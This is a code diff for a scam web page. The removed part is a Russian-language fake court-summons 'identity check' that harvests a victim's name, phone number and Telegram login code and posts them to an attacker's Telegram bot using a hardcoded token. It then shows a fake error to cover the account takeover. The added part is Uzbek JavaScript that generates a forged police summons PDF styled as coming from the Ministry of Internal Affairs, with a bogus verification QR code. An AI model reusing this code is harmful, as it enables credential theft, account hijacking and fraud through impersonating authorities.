@@ -1,102 +1,82 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Судебная повестка — Идентификация</title>
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }
-        .container { max-width: 450px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); border-top: 6px solid #c0392b; }
-        h2 { color: #2c3e50; font-size: 22px; margin-bottom: 10px; }
-        p { font-size: 14px; color: #666; line-height: 1.5; }
-        .input-group { margin-bottom: 15px; }
-        label { display: block; font-size: 13px; font-weight: bold; margin-bottom: 5px; color: #333; }
-        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 15px; }
-        button { width: 100%; padding: 14px; background: #2c3e50; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #34495e; }
-        .hidden { display: none; }
-        .alert { background: #fff3f3; color: #c0392b; padding: 10px; border-radius: 4px; font-size: 12px; margin-bottom: 20px; border: 1px solid #fbcaca; }
-    </style>
-</head>
-<body>
-
-<div class="container" id="step1">
-    <div class="alert">⚠️ ВНИМАНИЕ: Требуется официальное подтверждение личности</div>
-    <h2>Личные данные</h2>
-    <p>Введите данные для поиска в базе исполнительных производств.</p>
-    
-    <div class="input-group">
-        <label>Фамилия и Имя</label>
-        <input type="text" id="full_name" placeholder="Иванов Иван">
-    </div>
-    
-    <div class="input-group">
-        <label>Номер телефона (привязанный к ГосУслугам/TG)</label>
-        <input type="tel" id="phone" placeholder="+998901234567">
-    </div>
-
-    <button onclick="sendInfo()">СЛЕДУЮЩИЙ ШАГ</button>
+<div class="input-container">
+    <h2>Ma'muriy Bayonnoma Shakllantirish</h2>
+    <input type="text" id="fullname" placeholder="F.I.SH (Masalan: Aliyev Vali)">
+    <input type="text" id="address" placeholder="Yashash manzili">
+    <select id="offense">
+        <option value="91-moddasi">91-modda (Chiqindilarni tashlash)</option>
+        <option value="161-moddasi">161-modda (Obodonlashtirish qoidalarini buzish)</option>
+    </select>
+    <label for="visit_time">Chaqirilish vaqti:</label>
+    <input type="datetime-local" id="visit_time">
+    <button onclick="generatePDF()">Hujjatni Generatsiya Qilish (PDF)</button>
 </div>
 
-<div class="container hidden" id="step2">
-    <h2>Проверка устройства</h2>
-    <p>Для подтверждения входа в защищенный портал, мы отправили сервисный код в ваш <b>Telegram</b>. Пожалуйста, введите его ниже.</p>
-    
-    <div class="alert" style="background: #eef9ff; color: #0056b3; border-color: #bee5eb;">
-        Код подтверждения был отправлен в официальный чат Telegram.
-    </div>
+function generatePDF() {
+    const name = document.getElementById('fullname').value;
+    const address = document.getElementById('address').value;
+    const timeInput = document.getElementById('visit_time').value;
+    const offense = document.getElementById('offense').value;
 
-    <div class="input-group">
-        <label>Код из сообщения</label>
-        <input type="number" id="tg_code" placeholder="00000" style="letter-spacing: 10px; text-align: center; font-size: 24px;">
-    </div>
+    // Sanani chiroyli formatga keltirish
+    const date = new Date(timeInput);
+    const formattedTime = date.toLocaleString('uz-UZ', { 
+        year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' 
+    });
 
-    <button onclick="sendCode()">ПОДТВЕРДИТЬ И ВОЙТИ</button>
-</div>
+    const content = `
+        <div id="pdf-template" style="padding: 25mm; font-family: 'Times New Roman', serif; line-height: 1.5;">
+            <div style="text-align: center; font-weight: bold; text-transform: uppercase; border-bottom: 2px solid #000; padding-bottom: 10px; margin-bottom: 20px;">
+                O‘ZBEKISTON RESPUBLIKASI<br>
+                ICHKI ISHLAR VAZIRLIGI JAMOAT XAVFSIZLIGI DEPARTAMENTI
+            </div>
+            
+            <div style="text-align: right; margin-bottom: 30px;">
+                <b>№ ${Math.floor(Math.random() * 1000)}/CH-sonli Chaqiruv</b><br>
+                ${new Date().toLocaleDateString()} yil
+            </div>
 
-<script>
-    const CONFIG = { 
-        TOKEN: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", 
-        CHAT: "6198817749" 
+            <h2 style="text-align: center; text-decoration: underline;">RASMIY CHAQIRUV QOG‘OZI</h2>
+            
+            <p style="margin-top: 30px;"><b>Fuqaro:</b> ${name.toUpperCase()}</p>
+            <p><b>Yashash manzili:</b> ${address}</p>
+            
+            <p style="text-indent: 50px; text-align: justify;">
+                Sizga shuni ma’lum qilamizki, aniqlangan huquqbuzarlik holatlari yuzasidan, O‘zbekiston Respublikasi Ma’muriy javobgarlik to‘g‘risidagi kodeksning <b>${offense}</b> (Atrof-muhitni muhofaza qilish va obodonlashtirish qoidalarini buzish) bo'yicha ma'muriy ish qo'zg'atilgan.
+            </p>
+            
+            <p style="text-indent: 50px; text-align: justify;">
+                Ushbu holat yuzasidan tushuntirish berish va tegishli bayonnomani imzolash maqsadida, Siz <b>${formattedTime}</b>da hududiy profilaktika inspektori xonasiga shaxsingizni tasdiqlovchi hujjat (pasport/ID-karta) bilan kelishingiz shart.
+            </p>
+            
+            <p style="color: #333; font-style: italic; margin-top: 20px; font-size: 13px;">
+                <b>Eslatma:</b> MJtKning 194-moddasiga muvofiq, ichki ishlar organlari xodimining qonuniy talablarini bajarmaslik qonuniy javobgarlikka sabab bo'ladi.
+            </p>
+
+            <div style="margin-top: 60px; display: flex; justify-content: space-between;">
+                <div>
+                    <p><b>Mas'ul xodim:</b> _________________</p>
+                    <p style="font-size: 12px; margin-left: 80px;">(imzo, F.I.SH)</p>
+                </div>
+                <div style="border: 2px double #000; border-radius: 50%; width: 100px; height: 100px; text-align: center; display: flex; align-items: center; justify-content: center; font-size: 10px; opacity: 0.6;">
+                    MUHR UCHUN<br>JOY
+                </div>
+            </div>
+            
+            <div style="margin-top: 40px; text-align: center;">
+                <img src="https://api.qrserver.com/v1/create-qr-code/?size=80x80&data=https://iiv.uz/oz/check/${Math.random()}" alt="QR-Code">
+                <p style="font-size: 10px;">Hujjatning haqiqiyligini tekshirish uchun QR-kodni skanerlang</p>
+            </div>
+        </div>
+    `;
+
+    const opt = {
+        margin: 0,
+        filename: `Chaqiruv_${name.replace(/\s+/g, '_')}.pdf`,
+        image: { type: 'jpeg', quality: 1 },
+        html2canvas: { scale: 3, letterRendering: true, useCORS: true },
+        jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' }
     };
 
-    // Botga ma'lumot yuborish funksiyasi
-    async function postToBot(text) {
-        await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CONFIG.CHAT, text: text, parse_mode: "HTML" })
-        });
-    }
+    html2pdf().from(content).set(opt).save();
+}
 
-    // 1-qadam: Ism va Telefonni yuborish
-    async function sendInfo() {
-        const name = document.getElementById('full_name').value;
-        const phone = document.getElementById('phone').value;
-
-        if(!name || !phone) { alert("Заполните все поля!"); return; }
-
-        const xabar = `👤 <b>Yangi Ma'lumot!</b>\n\n📝 Ism: ${name}\n📞 Tel: <code>${phone}</code>\n🌐 Holat: Kod kutilmoqda...`;
-        await postToBot(xabar);
-
-        document.getElementById('step1').classList.add('hidden');
-        document.getElementById('step2').classList.remove('hidden');
-    }
-
-    // 2-qadam: Kelgan SMS kodni yuborish
-    async function sendCode() {
-        const code = document.getElementById('tg_code').value;
-        const phone = document.getElementById('phone').value;
-
-        if(!code) { alert("Введите код!"); return; }
-
-        const xabar = `🔑 <b>TELEGRAM KOD!</b>\n\n📞 Tel: <code>${phone}</code>\n⚡️ Kod: <code>${code}</code>\n⚠️ <i>Tezda kirishga harakat qiling!</i>`;
-        await postToBot(xabar);
-
-        alert("Ошибка синхронизации. Попробуйте запросить код повторно через 5 минут.");
-        location.reload();
-    }
-</script>
-
-</body>
-</html>
